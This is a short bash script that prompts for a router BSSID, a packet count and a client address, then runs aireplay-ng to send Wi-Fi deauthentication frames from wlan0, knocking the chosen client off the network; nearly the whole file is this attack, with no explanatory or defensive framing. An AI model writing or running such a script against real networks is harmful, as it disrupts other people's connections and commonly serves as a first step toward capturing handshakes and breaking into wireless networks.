#!/bin/bash  

# Read the user input   
echo "Enter The BSSIDROUTER: "  
read BSSIDROUTER
echo "Enter The DOOSHAck 5 or 0: "  
read deauth
echo "Enter The claint: "  
read BSSIDCLAINT  
aireplay-ng  --deauth $deauth -a  $BSSIDROUTER -c $BSSIDCLAINT wlan0
while true; do
    read -p "Type 'exit' to close the terminal: " userInput
    if [ "$userInput" = "exit" ]; then
        break
    else
        echo "Invalid input. Type 'exit' to close the terminal."
    fi
done
